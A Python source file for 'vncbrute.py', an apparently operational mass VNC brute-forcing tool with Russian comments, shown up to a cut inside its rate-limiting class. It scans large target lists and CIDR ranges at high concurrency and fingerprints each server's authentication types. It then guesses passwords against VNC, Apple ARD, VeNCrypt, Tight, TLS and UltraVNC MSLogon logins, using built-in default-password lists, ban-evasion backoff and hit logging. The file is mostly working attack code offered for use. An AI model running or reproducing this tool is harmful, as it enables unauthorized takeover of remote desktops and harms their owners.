# requirements: rich==13.7.1, cryptography==42.0.5, uvloop==0.19.0 (опционально, *nix)
# файл: vncbrute.py  (v4.1, phantom edition)
#
# changelog v4.0 → v4.1:
#   [fix] render(): ETA больше не дёргает load_wordlist каждый кадр,
#         считается честно через avg attempts/host из реальных данных
#   [fix] pipeline: число sentinel-ов == числу реально созданных
#         воркеров (раньше при concurrency > 1024 был дедлок на q.join)
#   [fix] HostGate.lock_for / Engine._host_rl: устранена гонка инициализации
#         через dict.setdefault (атомарно в CPython)
#   [fix] prioritize_wordlist: пустой пароль "" принудительно первым,
#         даже если его нет в wordlist
#   [new] ban-эвристика: на хостах с успешным probe-handshake серия
#         dead:closed трактуется как rate-limit (backoff), а не смерть
#   [new] финальный snapshot после фазы done
#   [new] asyncio.Lock на debug-файл (раньше могли рваться строки)
#   [new] start_tls передаёт server_hostname (для строгих SNI)
#
# запуск:
#   pip install rich==13.7.1 cryptography==42.0.5
#   pip install uvloop==0.19.0   # опц. для *nix, ~x2 скорости
#
#   python vncbrute.py -i targets.txt -w wl.txt \
#       --prescan-concurrency 4000 --prescan-timeout 1.5 \
#       --probe-concurrency 1000  --probe-timeout 5.0 \
#       --brute-concurrency 400   --brute-timeout 7.0 \
#       --rate-global 2000 --rate-per-host 4 \
#       -o hits --shuffle --resume \
#       --ard-users users.txt --ard-max-users 5 \
#       --mslogon-creds mslogon.txt --allow-mslogon \
#       --debug debug.log

from __future__ import annotations
import argparse, asyncio, csv, ipaddress, json, os, random, signal, ssl, struct, sys, time
from collections import Counter, deque
from dataclasses import dataclass, field
from hashlib import md5, sha1
from pathlib import Path
from typing import Iterator, Optional

try:
    import uvloop  # type: ignore
    HAS_UVLOOP = True
except ImportError:
    HAS_UVLOOP = False

try:
    import resource
    HAS_RESOURCE = True
except ImportError:
    HAS_RESOURCE = False

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.ciphers.algorithms import AES
from cryptography.hazmat.primitives.ciphers.modes import CFB
from cryptography.hazmat.backends import default_backend

from rich.console import Console, Group
from rich.live import Live
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich.align import Align
from rich.columns import Columns


# ─── CONSTS ─────────────────────────────────────────────────────────

PRIO_PASSWORDS = [
    "", "password", "123456", "admin", "vnc", "1234", "12345678",
    "root", "raspberry", "ubnt",
]
BUILTIN_PASSWORDS = PRIO_PASSWORDS + [
    "12345", "qwerty", "vncpass", "user", "guest", "test", "letmein",
    "welcome", "secret", "changeme", "default", "password1", "support",
    "monitor", "operator", "111111", "000000", "abc123", "passw0rd",
    "qwerty123", "pi", "cisco", "Administrator",
    "admin123", "P@ssw0rd", "remote", "1q2w3e4r", "qazwsx", "master",
]
BUILTIN_ARD_USERS = [
    "administrator", "admin", "root", "user", "macbook",
    "imac", "mac", "apple", "guest", "test", "support",
]
SEC_TYPES = {
    0:"Invalid",1:"None",2:"VNC",5:"RA2",6:"RA2ne",16:"Tight",17:"Ultra",
    18:"TLS",19:"VeNCrypt",20:"SASL",21:"MD5",22:"xvp",30:"AppleARD",
    35:"Mac",113:"MSLogonI",114:"MSLogonII",115:"SecureVNC",116:"SecureVNC+ML1",
    117:"SecureVNC+ML2",129:"TightExt",
}
VENC_SUB = {
    256:"Plain",257:"TLSNone",258:"TLSVnc",
    259:"TLSPlain",260:"X509None",261:"X509Vnc",262:"X509Plain",
}
VENC_BRUT = {256:("plain",False),258:("vnc",True),259:("plain",True),
             261:("vnc",True),262:("plain",True)}

BRUTABLE_SEC = {1, 2, 16, 18, 30, 113, 114, 129}
UNBRUTABLE_SEC = {5, 6, 115, 116, 117}

BANNER = r"""
██╗   ██╗███╗   ██╗ ██████╗   ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
██║   ██║████╗  ██║██╔════╝   ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
██║   ██║██╔██╗ ██║██║        ██████╔╝██████╔╝██║   ██║   ██║   █████╗
╚██╗ ██╔╝██║╚██╗██║██║        ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝
 ╚████╔╝ ██║ ╚████║╚██████╗   ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
  ╚═══╝  ╚═╝  ╚═══╝ ╚═════╝   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
                          v4.1 · phantom edition · rfx
"""


# ─── CRYPTO ─────────────────────────────────────────────────────────

_BR = bytes(int(f"{i:08b}"[::-1], 2) for i in range(256))
_BACKEND = default_backend()

def _vnc_key(pw: str) -> bytes:
    k = pw.encode("latin-1", "ignore")[:8].ljust(8, b"\x00")
    return bytes(_BR[b] for b in k)

def vnc_response(pw: str, challenge: bytes) -> bytes:
    k = _vnc_key(pw)
    enc = Cipher(algorithms.TripleDES(k+k+k), modes.ECB(), backend=_BACKEND).encryptor()
    return enc.update(challenge) + enc.finalize()

def _ard_creds(u: str, p: str) -> bytes:
    return (u.encode("utf-8","ignore")[:64].ljust(64,b"\x00")
          + p.encode("utf-8","ignore")[:64].ljust(64,b"\x00"))

def _arc4(key: bytes, data: bytes) -> bytes:
    S = list(range(256)); j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    out = bytearray(len(data)); i = j = 0
    for k in range(len(data)):
        i = (i + 1) & 0xFF; j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        out[k] = data[k] ^ S[(S[i] + S[j]) & 0xFF]
    return bytes(out)


# ─── MODELS ─────────────────────────────────────────────────────────

@dataclass
class Target:
    host: str
    port: int = 5900
    def __str__(self): return f"{self.host}:{self.port}"
    @property
    def key(self): return f"{self.host}:{self.port}"

@dataclass
class ProbeResult:
    target: Target
    alive: bool = False
    version: str = ""
    sec_types: list[int] = field(default_factory=list)
    note: str = ""
    no_auth: bool = False
    supports_vnc: bool = False
    supports_ard: bool = False
    supports_vencrypt: bool = False
    supports_tight: bool = False
    supports_tls: bool = False
    supports_mslogon1: bool = False
    supports_mslogon2: bool = False
    has_ra2: bool = False
    venc_subs: list[int] = field(default_factory=list)

@dataclass
class Stats:
    total: int = 0
    prescanned: int = 0
    prescan_open: int = 0
    prescan_dead: int = 0
    probed: int = 0
    alive: int = 0
    bruted: int = 0
    cracked: int = 0
    no_auth: int = 0
    unsupported: int = 0
    unbrutable: int = 0
    attempts: int = 0
    errors: int = 0
    phase: str = "init"
    hit_kinds: Counter = field(default_factory=Counter)
    error_kinds: Counter = field(default_factory=Counter)
    started: float = field(default_factory=time.time)
    last_hits: deque = field(default_factory=lambda: deque(maxlen=8))
    last_tries: deque = field(default_factory=lambda: deque(maxlen=12))
    inflight: set[str] = field(default_factory=set)
    aps_hist: deque = field(default_factory=lambda: deque(maxlen=60))
    eps_hist: deque = field(default_factory=lambda: deque(maxlen=60))
    _last_a: int = 0
    _last_e: int = 0
    _last_t: float = field(default_factory=time.time)

    def tick(self):
        now = time.time(); dt = now - self._last_t
        if dt >= 0.5:
            self.aps_hist.append((self.attempts - self._last_a) / dt)
            self.eps_hist.append((self.errors - self._last_e) / dt)
            self._last_a, self._last_e, self._last_t = self.attempts, self.errors, now

    @property
    def aps(self): return self.attempts / max(time.time() - self.started, 0.001)


# ─── IO ─────────────────────────────────────────────────────────────

def iter_targets(path: Path) -> Iterator[Target]:
    seen: set[tuple[str,int]] = set()
    for raw in path.read_text(encoding="utf-8", errors="ignore").splitlines():
        line = raw.strip()
        if not line or line.startswith("#"): continue
        port = 5900; host_part = line
        if "/" in line and ":" not in line:
            try:
                net = ipaddress.ip_network(line, strict=False)
                for ip in net.hosts():
                    k = (str(ip), port)
                    if k not in seen:
                        seen.add(k); yield Target(str(ip), port)
                continue
            except ValueError: pass
        if line.count(":") == 1:
            host_part, p = line.rsplit(":", 1)
            try: port = int(p)
            except ValueError: continue
        k = (host_part, port)
        if k not in seen:
            seen.add(k); yield Target(host_part, port)

def load_wordlist(path: Optional[str]) -> list[str]:
    if not path: return list(BUILTIN_PASSWORDS)
    raw = Path(path).read_text(encoding="utf-8", errors="ignore").splitlines()
    seen, out = set(), []
    for p in raw:
        p = p.rstrip("\r\n")
        if p in seen: continue
        seen.add(p); out.append(p)
    return out

def prioritize_wordlist(words: list[str], shuffle: bool) -> list[str]:
    """пустой пароль + топ ходовые — первыми; пустой добавляется ВСЕГДА,
    даже если его нет в пользовательском wordlist (fix v4.1 #4)"""
    head, tail = [], []
    seen_head: set[str] = set()
    words_set = set(words)
    # пустой пароль — безусловно первый
    head.append("")
    seen_head.add("")
    for p in PRIO_PASSWORDS:
        if p in words_set and p not in seen_head:
            head.append(p); seen_head.add(p)
    for p in words:
        if p not in seen_head:
            tail.append(p)
    if shuffle:
        random.shuffle(tail)
    return head + tail

def load_mslogon_creds(path: Optional[str]) -> list[tuple[str,str]]:
    if not path: return []
    out: list[tuple[str,str]] = []
    seen: set[tuple[str,str]] = set()
    for raw in Path(path).read_text(encoding="utf-8", errors="ignore").splitlines():
        line = raw.strip()
        if not line or line.startswith("#") or ":" not in line: continue
        u, p = line.split(":", 1); k = (u, p)
        if k not in seen:
            seen.add(k); out.append(k)
    return out


# ─── NET ────────────────────────────────────────────────────────────

async def _readn(r, n, to): return await asyncio.wait_for(r.readexactly(n), timeout=to)

async def _open(t: Target, to: float):
    return await asyncio.wait_for(asyncio.open_connection(t.host, t.port), timeout=to)

async def _close(w):
    try:
        w.close(); await asyncio.wait_for(w.wait_closed(), timeout=1.0)
    except Exception: pass

async def _rfb_hs(r, w, to) -> Optional[int]:
    banner = await _readn(r, 12, to)
    if not banner.startswith(b"RFB "): return None
    try: minor = int(banner[8:11])
    except ValueError: return None
    cm = 8 if minor >= 8 else (7 if minor >= 7 else 3)
    w.write(f"RFB 003.00{cm}\n".encode("ascii")); await w.drain()
    return cm

async def _read_sec(r, cm, to) -> tuple[list[int], Optional[str]]:
    if cm == 3:
        sec = struct.unpack(">I", await _readn(r, 4, to))[0]
        if sec == 0:
            rl = struct.unpack(">I", await _readn(r, 4, to))[0]
            return [], (await _readn(r, rl, to)).decode("latin-1","replace")[:80]
        return [sec], None
    n = (await _readn(r, 1, to))[0]
    if n == 0:
        rl = struct.unpack(">I", await _readn(r, 4, to))[0]
        return [], (await _readn(r, rl, to)).decode("latin-1","replace")[:80]
    return list(await _readn(r, n, to)), None

async def _start_tls(r, w, to: float, server_hostname: Optional[str] = None):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try: ctx.set_ciphers("ALL:@SECLEVEL=0")
    except ssl.SSLError: pass
    loop = asyncio.get_running_loop()
    tr = w.transport
    proto = tr.get_protocol()
    new_tr = await asyncio.wait_for(
        loop.start_tls(tr, proto, ctx, server_side=False,
                       server_hostname=server_hostname),
        timeout=to,
    )
    nr = asyncio.StreamReader(loop=loop)
    np_ = asyncio.StreamReaderProtocol(nr, loop=loop)
    new_tr.set_protocol(np_); np_.connection_made(new_tr)
    nw = asyncio.StreamWriter(new_tr, np_, nr, loop)
    return nr, nw


# ─── PRESCAN ────────────────────────────────────────────────────────

async def tcp_alive(t: Target, to: float) -> bool:
    try:
        r, w = await asyncio.wait_for(
            asyncio.open_connection(t.host, t.port), timeout=to)
        await _close(w)
        return True
    except Exception:
        return False


# ─── PROBE (single-connection, includes venc subs) ──────────────────

async def probe(t: Target, to: float) -> ProbeResult:
    res = ProbeResult(target=t)
    try:
        r, w = await _open(t, to)
    except asyncio.TimeoutError: res.note = "timeout"; return res
    except ConnectionRefusedError: res.note = "refused"; return res
    except OSError as e: res.note = f"net:{e.__class__.__name__}"; return res
    try:
        cm = await _rfb_hs(r, w, to)
        if cm is None: res.note = "not-rfb"; return res
        res.version = f"RFB 3.{cm}"
        sec, err = await _read_sec(r, cm, to)
        if err is not None: res.note = f"srv:{err}"; return res
        res.sec_types = sec; res.alive = True
        res.no_auth          = 1   in sec
        res.supports_vnc     = 2   in sec
        res.supports_ard     = 30  in sec
        res.supports_vencrypt= 19  in sec
        res.supports_tight   = 16  in sec or 129 in sec
        res.supports_tls     = 18  in sec
        res.supports_mslogon1= 113 in sec
        res.supports_mslogon2= 114 in sec
        res.has_ra2          = 5   in sec or 6 in sec

        if res.supports_vencrypt:
            try:
                if cm != 3:
                    w.write(bytes([19])); await w.drain()
                await _readn(r, 2, to)
                w.write(bytes([0, 2])); await w.drain()
                if (await _readn(r, 1, to))[0] == 0:
                    cnt = (await _readn(r, 1, to))[0]
                    if cnt > 0:
                        raw = await _readn(r, 4*cnt, to)
                        res.venc_subs = [struct.unpack(">I", raw[i*4:(i+1)*4])[0]
                                         for i in range(cnt)]
            except Exception:
                pass

    except asyncio.IncompleteReadError: res.note = "closed"; return res
    except asyncio.TimeoutError: res.note = "timeout"; return res
    except Exception as e: res.note = f"err:{e.__class__.__name__}"; return res
    finally: await _close(w)

    has_brutable = any(s in BRUTABLE_SEC for s in res.sec_types)
    if res.supports_vencrypt and any(s in VENC_BRUT for s in res.venc_subs):
        has_brutable = True
    if not has_brutable:
        names = ",".join(SEC_TYPES.get(x, str(x)) for x in res.sec_types)
        if res.venc_subs:
            names += "|venc:" + ",".join(VENC_SUB.get(s, str(s)) for s in res.venc_subs)
        only_unbrutable = all((s in UNBRUTABLE_SEC) or (s == 0) for s in res.sec_types)
        res.note = f"{'unbrutable' if only_unbrutable or (res.has_ra2 and not has_brutable) else 'unsupported'}:{names}"
    return res


# ─── ATTEMPTS ───────────────────────────────────────────────────────

def _classify_ban(s: str) -> bool:
    l = s.lower()
    return (("too many" in l) or ("blocked" in l) or ("blacklist" in l)
            or ("rate" in l and "limit" in l) or ("locked" in l))

async def attempt_vnc(t: Target, pw: str, to: float) -> tuple[str, str]:
    try: r, w = await _open(t, to)
    except asyncio.TimeoutError: return "dead", "timeout"
    except ConnectionRefusedError: return "dead", "refused"
    except OSError as e: return "dead", e.__class__.__name__
    try:
        cm = await _rfb_hs(r, w, to)
        if cm is None: return "dead", "not-rfb"
        sec, err = await _read_sec(r, cm, to)
        if err: return ("banlike", err) if _classify_ban(err) else ("error", err)
        if 2 not in sec: return "error", "no-vnc-auth"
        if cm != 3:
            w.write(bytes([2])); await w.drain()
        ch = await _readn(r, 16, to)
        w.write(vnc_response(pw, ch)); await w.drain()
        result = struct.unpack(">I", await _readn(r, 4, to))[0]
        if result == 0: return "cracked", f"VNC/RFB3.{cm}"
        if cm == 8:
            try:
                rl = struct.unpack(">I", await _readn(r, 4, 1.5))[0]
                reason = (await _readn(r, rl, 1.5)).decode("latin-1","replace")
                if _classify_ban(reason): return "banlike", reason[:80]
            except Exception: pass
        return "fail", ""
    except asyncio.IncompleteReadError: return "dead", "closed"
    except asyncio.TimeoutError: return "dead", "timeout"
    except Exception as e: return "error", e.__class__.__name__
    finally: await _close(w)

async def attempt_ard(t: Target, user: str, pw: str, to: float) -> tuple[str, str]:
    try: r, w = await _open(t, to)
    except asyncio.TimeoutError: return "dead", "timeout"
    except ConnectionRefusedError: return "dead", "refused"
    except OSError as e: return "dead", e.__class__.__name__
    try:
        cm = await _rfb_hs(r, w, to)
        if cm is None: return "dead", "not-rfb"
        sec, err = await _read_sec(r, cm, to)
        if err: return ("banlike", err) if _classify_ban(err) else ("error", err)
        if 30 not in sec: return "error", "no-ard"
        if cm != 3:
            w.write(bytes([30])); await w.drain()
        g = struct.unpack(">H", await _readn(r, 2, to))[0]
        keylen = struct.unpack(">H", await _readn(r, 2, to))[0]
        if keylen == 0 or keylen > 4096: return "error", f"bad-keylen:{keylen}"
        prime_b = await _readn(r, keylen, to)
        spub_b  = await _readn(r, keylen, to)
        p = int.from_bytes(prime_b, "big")
        spub = int.from_bytes(spub_b, "big")
        if p < 2 or spub < 2: return "error", "bad-dh"
        priv = int.from_bytes(os.urandom(keylen), "big") % (p - 2) + 1
        cpub = pow(g, priv, p)
        shared = pow(spub, priv, p)
        aes_key = md5(shared.to_bytes(keylen, "big")).digest()
        creds = _ard_creds(user, pw)
        enc = Cipher(AES(aes_key), modes.ECB(), backend=_BACKEND).encryptor()
        ct = enc.update(creds) + enc.finalize()
        w.write(ct + cpub.to_bytes(keylen, "big")); await w.drain()
        result = struct.unpack(">I", await _readn(r, 4, to))[0]
        if result == 0: return "cracked", f"ARD u={user}"
        if cm == 8:
            try:
                rl = struct.unpack(">I", await _readn(r, 4, 1.5))[0]
                reason = (await _readn(r, rl, 1.5)).decode("latin-1","replace")
                if _classify_ban(reason): return "banlike", reason[:80]
            except Exception: pass
        return "fail", ""
    except asyncio.IncompleteReadError: return "dead", "closed"
    except asyncio.TimeoutError: return "dead", "timeout"
    except Exception as e: return "error", e.__class__.__name__
    finally: await _close(w)


def pick_venc(avail: list[int], want_user: bool) -> Optional[int]:
    order = (262, 259, 256) if want_user else (261, 258)
    for s in order:
        if s in avail: return s
    return None


async def attempt_venc(t: Target, sub: int, user: str, pw: str,
                       to: float) -> tuple[str, str]:
    if sub not in VENC_BRUT: return "error", f"bad-sub:{sub}"
    kind, use_tls = VENC_BRUT[sub]
    try: r, w = await _open(t, to)
    except asyncio.TimeoutError: return "dead", "timeout"
    except ConnectionRefusedError: return "dead", "refused"
    except OSError as e: return "dead", e.__class__.__name__
    try:
        cm = await _rfb_hs(r, w, to)
        if cm is None: return "dead", "not-rfb"
        sec, err = await _read_sec(r, cm, to)
        if err: return ("banlike", err) if _classify_ban(err) else ("error", err)
        if 19 not in sec: return "error", "no-venc"
        if cm != 3:
            w.write(bytes([19])); await w.drain()
        await _readn(r, 2, to)
        w.write(bytes([0, 2])); await w.drain()
        if (await _readn(r, 1, to))[0] != 0: return "error", "venc-ver-nak"
        cnt = (await _readn(r, 1, to))[0]
        if cnt == 0: return "error", "no-subs"
        raw = await _readn(r, 4 * cnt, to)
        avail = [struct.unpack(">I", raw[i*4:(i+1)*4])[0] for i in range(cnt)]
        if sub not in avail: return "error", f"sub-unavail:{sub}"
        w.write(struct.pack(">I", sub)); await w.drain()
        if use_tls:
            if (await _readn(r, 1, to))[0] != 1: return "error", "venc-sub-nak"
            try:
                r, w = await _start_tls(r, w, to, server_hostname=t.host)
            except Exception as e:
                return "error", f"tls:{e.__class__.__name__}"
        if kind == "plain":
            ub = user.encode("utf-8","ignore"); pb = pw.encode("utf-8","ignore")
            w.write(struct.pack(">II", len(ub), len(pb)) + ub + pb); await w.drain()
            result = struct.unpack(">I", await _readn(r, 4, to))[0]
            if result == 0:
                return "cracked", f"VeNCrypt/{VENC_SUB.get(sub, sub)} u={user}"
            return "fail", ""
        else:
            ch = await _readn(r, 16, to)
            w.write(vnc_response(pw, ch)); await w.drain()
            result = struct.unpack(">I", await _readn(r, 4, to))[0]
            if result == 0:
                return "cracked", f"VeNCrypt/{VENC_SUB.get(sub, sub)}"
            return "fail", ""
    except asyncio.IncompleteReadError: return "dead", "closed"
    except asyncio.TimeoutError: return "dead", "timeout"
    except Exception as e: return "error", e.__class__.__name__
    finally: await _close(w)


async def attempt_tight(t: Target, pw: str, to: float) -> tuple[str, str]:
    try: r, w = await _open(t, to)
    except asyncio.TimeoutError: return "dead", "timeout"
    except ConnectionRefusedError: return "dead", "refused"
    except OSError as e: return "dead", e.__class__.__name__
    try:
        cm = await _rfb_hs(r, w, to)
        if cm is None: return "dead", "not-rfb"
        sec, err = await _read_sec(r, cm, to)
        if err: return ("banlike", err) if _classify_ban(err) else ("error", err)
        if 16 not in sec and 129 not in sec: return "error", "no-tight"
        sel = 16 if 16 in sec else 129
        if cm != 3:
            w.write(bytes([sel])); await w.drain()

        tcnt = struct.unpack(">I", await _readn(r, 4, to))[0]
        if tcnt > 0:
            tcaps = await _readn(r, 16 * tcnt, to)
            tcodes = [struct.unpack(">I", tcaps[i*16:i*16+4])[0] for i in range(tcnt)]
            if 0 not in tcodes:
                return "error", f"tight-no-notunnel:{tcodes[:4]}"
            w.write(struct.pack(">I", 0)); await w.drain()  # NOTUNNEL

        acnt = struct.unpack(">I", await _readn(r, 4, to))[0]
        if acnt == 0:
            result = struct.unpack(">I", await _readn(r, 4, to))[0]
            if result == 0: return "cracked", "Tight/NoAuth"
            return "fail", ""

        caps = await _readn(r, 16 * acnt, to)
        codes = [struct.unpack(">I", caps[i*16:i*16+4])[0] for i in range(acnt)]
        if 2 not in codes:
            return "error", f"tight-no-stdv:{codes}"
        w.write(struct.pack(">I", 2)); await w.drain()

        ch = await _readn(r, 16, to)
        w.write(vnc_response(pw, ch)); await w.drain()
        result = struct.unpack(">I", await _readn(r, 4, to))[0]
        if result == 0: return "cracked", "Tight/STDV"
        return "fail", ""
    except asyncio.IncompleteReadError: return "dead", "closed"
    except asyncio.TimeoutError: return "dead", "timeout"
    except Exception as e: return "error", e.__class__.__name__
    finally: await _close(w)


async def _post_tls_auth(r, w, pw: str, to: float) -> tuple[str, str]:
    try:
        n = (await _readn(r, 1, to))[0]
        if n == 0:
            try:
                rl = struct.unpack(">I", await _readn(r, 4, to))[0]
                reason = (await _readn(r, rl, to)).decode("latin-1","replace")
                return ("banlike", reason[:80]) if _classify_ban(reason) else ("error", reason[:80])
            except Exception:
                return "error", "tls-srv-err"
        types = list(await _readn(r, n, to))
        if 1 in types:
            w.write(bytes([1])); await w.drain()
            result = struct.unpack(">I", await _readn(r, 4, to))[0]
            if result == 0: return "cracked", "TLS/None"
            return "fail", ""
        if 2 in types:
            w.write(bytes([2])); await w.drain()
            ch = await _readn(r, 16, to)
            w.write(vnc_response(pw, ch)); await w.drain()
            result = struct.unpack(">I", await _readn(r, 4, to))[0]
            if result == 0: return "cracked", "TLS/VNC"
            try:
                rl = struct.unpack(">I", await _readn(r, 4, 1.5))[0]
                reason = (await _readn(r, rl, 1.5)).decode("latin-1","replace")
                if _classify_ban(reason): return "banlike", reason[:80]
            except Exception: pass
            return "fail", ""
        return "error", f"tls-inner:{types}"
    except asyncio.IncompleteReadError: return "dead", "closed"
    except asyncio.TimeoutError: return "dead", "timeout"
    except Exception as e: return "error", e.__class__.__name__


async def attempt_tls(t: Target, pw: str, to: float) -> tuple[str, str]:
    try: r, w = await _open(t, to)
    except asyncio.TimeoutError: return "dead", "timeout"
    except ConnectionRefusedError: return "dead", "refused"
    except OSError as e: return "dead", e.__class__.__name__
    try:
        cm = await _rfb_hs(r, w, to)
        if cm is None: return "dead", "not-rfb"
        sec, err = await _read_sec(r, cm, to)
        if err: return ("banlike", err) if _classify_ban(err) else ("error", err)
        if 18 not in sec: return "error", "no-tls"
        if cm != 3:
            w.write(bytes([18])); await w.drain()
        try:
            r, w = await _start_tls(r, w, to, server_hostname=t.host)
        except Exception as e:
            return "error", f"tls:{e.__class__.__name__}"
        return await _post_tls_auth(r, w, pw, to)
    except asyncio.IncompleteReadError: return "dead", "closed"
    except asyncio.TimeoutError: return "dead", "timeout"
    except Exception as e: return "error", e.__class__.__name__
    finally: await _close(w)


async def attempt_mslogon1(t: Target, user: str, pw: str, to: float) -> tuple[str, str]:
    try: r, w = await _open(t, to)
    except asyncio.TimeoutError: return "dead", "timeout"
    except ConnectionRefusedError: return "dead", "refused"
    except OSError as e: return "dead", e.__class__.__name__
    try:
        cm = await _rfb_hs(r, w, to)
        if cm is None: return "dead", "not-rfb"
        sec, err = await _read_sec(r, cm, to)
        if err: return ("banlike", err) if _classify_ban(err) else ("error", err)
        if 113 not in sec: return "error", "no-mslogon1"
        if cm != 3:
            w.write(bytes([113])); await w.drain()
        gen_b  = await _readn(r, 8, to)
        mod_b  = await _readn(r, 8, to)
        spub_b = await _readn(r, 8, to)
        g = int.from_bytes(gen_b, "big")
        p = int.from_bytes(mod_b, "big")
        spub = int.from_bytes(spub_b, "big")
        if p < 2 or g < 2: return "error", "mslogon1-bad-dh"
        priv = int.from_bytes(os.urandom(8), "big") % (p - 2) + 1
        cpub = pow(g, priv, p)
        shared = pow(spub, priv, p)
        key = md5(shared.to_bytes(8, "big")).digest()
        ub = user.encode("utf-8","ignore")[:256].ljust(256, b"\x00")
        pb = pw.encode("utf-8","ignore")[:64].ljust(64, b"\x00")
        w.write(cpub.to_bytes(8,"big") + _arc4(key, ub) + _arc4(key, pb))
        await w.drain()
        result = struct.unpack(">I", await _readn(r, 4, to))[0]
        if result == 0: return "cracked", f"MSLogon-I u={user}"
        if cm == 8:
            try:
                rl = struct.unpack(">I", await _readn(r, 4, 1.5))[0]
                reason = (await _readn(r, rl, 1.5)).decode("latin-1","replace")
                if _classify_ban(reason): return "banlike", reason[:80]
            except Exception: pass
        return "fail", ""
    except asyncio.IncompleteReadError: return "dead", "closed"
    except asyncio.TimeoutError: return "dead", "timeout"
    except Exception as e: return "error", f"mslogon1:{e.__class__.__name__}"
    finally: await _close(w)


async def attempt_mslogon2(t: Target, user: str, pw: str, to: float) -> tuple[str, str]:
    try: r, w = await _open(t, to)
    except asyncio.TimeoutError: return "dead", "timeout"
    except ConnectionRefusedError: return "dead", "refused"
    except OSError as e: return "dead", e.__class__.__name__
    try:
        cm = await _rfb_hs(r, w, to)
        if cm is None: return "dead", "not-rfb"
        sec, err = await _read_sec(r, cm, to)
        if err: return ("banlike", err) if _classify_ban(err) else ("error", err)
        if 114 not in sec: return "error", "no-mslogon2"
        if cm != 3:
            w.write(bytes([114])); await w.drain()
        g = struct.unpack(">I", await _readn(r, 4, to))[0]
        keylen = struct.unpack(">I", await _readn(r, 4, to))[0]
        if keylen == 0 or keylen > 4096: return "error", f"mslogon2-keylen:{keylen}"
        mod_b  = await _readn(r, keylen, to)
        spub_b = await _readn(r, keylen, to)
        p = int.from_bytes(mod_b, "big")
        spub = int.from_bytes(spub_b, "big")
        if p < 2 or g < 2: return "error", "mslogon2-bad-dh"
        priv = int.from_bytes(os.urandom(keylen), "big") % (p - 2) + 1
        cpub = pow(g, priv, p)
        shared = pow(spub, priv, p)
        aes_key = sha1(shared.to_bytes(keylen, "big")).digest()[:16]
        iv = b"\x00" * 16
        enc = Cipher(AES(aes_key), CFB(iv), backend=_BACKEND).encryptor()
        ub = user.encode("utf-8","ignore")[:256].ljust(256, b"\x00")
        pb = pw.encode("utf-8","ignore")[:64].ljust(64, b"\x00")
        ct = enc.update(ub + pb) + enc.finalize()
        w.write(cpub.to_bytes(keylen, "big") + ct); await w.drain()
        result = struct.unpack(">I", await _readn(r, 4, to))[0]
        if result == 0: return "cracked", f"MSLogon-II u={user}"
        if cm == 8:
            try:
                rl = struct.unpack(">I", await _readn(r, 4, 1.5))[0]
                reason = (await _readn(r, rl, 1.5)).decode("latin-1","replace")
                if _classify_ban(reason): return "banlike", reason[:80]
            except Exception: pass
        return "fail", ""
    except asyncio.IncompleteReadError: return "dead", "closed"
    except asyncio.TimeoutError: return "dead", "timeout"
    except Exception as e: return "error", f"mslogon2:{e.__class__.__name__}"
    finally: await _close(w)


# ─── HIT WRITER / STATE ─────────────────────────────────────────────

class HitWriter:
    def __init__(self, base: str):
        self.base = base
        self.jp = Path(f"{base}.jsonl")
        self.cp = Path(f"{base}.csv")
        self.lp = Path(f"{base}.log.jsonl")
        new_csv = (not self.cp.exists()) or self.cp.stat().st_size == 0
        self.jf = self.jp.open("a", encoding="utf-8")
        self.cf = self.cp.open("a", newline="", encoding="utf-8")
        self.cw = csv.writer(self.cf)
        self.lf = self.lp.open("a", encoding="utf-8")
        if new_csv:
            self.cw.writerow(["ts","host","port","status","password","version","note"])
        self.lock = asyncio.Lock()

    async def write(self, host, port, status, password, version, note=""):
        ts = time.strftime("%Y-%m-%dT%H:%M:%S")
        row = {"ts":ts,"host":host,"port":port,"status":status,
               "password":password,"version":version,"note":note}
        async with self.lock:
            self.jf.write(json.dumps(row, ensure_ascii=False) + "\n"); self.jf.flush()
            self.cw.writerow([ts,host,port,status,password,version,note]); self.cf.flush()

    async def event(self, level, msg, **extra):
        ts = time.strftime("%Y-%m-%dT%H:%M:%S")
        async with self.lock:
            self.lf.write(json.dumps({"ts":ts,"level":level,"msg":msg,**extra},
                                     ensure_ascii=False) + "\n")
            self.lf.flush()

    def close(self):
        for f in (self.jf, self.cf, self.lf):
            try: f.close()
            except Exception: pass

    def load_done(self) -> set[str]:
        done: set[str] = set()
        if not self.jp.exists(): return done
        for line in self.jp.read_text(encoding="utf-8", errors="ignore").splitlines():
            try: rr = json.loads(line)
            except Exception: continue
            st = rr.get("status","")
            if st.startswith("cracked") or st in ("no_auth","unsupported","unbrutable"):
                done.add(f"{rr['host']}:{rr['port']}")
        return done


class StateSnap:
    def __init__(self, path: str):
        self.path = Path(path); self.lock = asyncio.Lock()
    async def write(self, payload: dict):
        async with self.lock:
            tmp = self.path.with_suffix(".tmp")
            tmp.write_text(json.dumps(payload, ensure_ascii=False, default=str),
                           encoding="utf-8")
            tmp.replace(self.path)


# ─── RATE LIMITERS ──────────────────────────────────────────────────

class TokenBucket:
    def __init__(self, rate: float, burst: Optional[float] = None):
        self.rate = max(rate, 0.0)
        self.cap = burst if burst is not None else max(rate, 1.0)
        self.tokens = self.cap
        self.ts = time.monotonic()
        self.lock = asyncio.Lock()
    async def take(self, n: float = 1.0):
        if self.rate <= 0: return
        async with self.lock:
            while True:
                now = time.monotonic()
                self.tokens = min(self.cap, self.tokens + (now - self.ts) * self.rate)
                self.ts = now
                if self.tokens >= n:
                    self.tokens -= n; return
                deficit = n - self.tokens
                await asyncio.sleep(deficit / self.rate)


class HostGate:
    """per host:port lock + adaptive delay.
    fix v4.1 #3: setdefault — атомарно в CPython, гонка инициализации устранена."""
    def __init__(self, base_delay: float = 0.0):
        self.base = base_delay
        self.gates: dict[str, asyncio.Lock] = {}
        self.delays: dict[str, float] = {}
    def lock_for(self, key: str) -> asyncio.Lock:
        lock = self.gates.get(key)
        if lock is None:
            new_lock = asyncio.Lock()
            lock = self.gates.setdefault(key, new_lock)
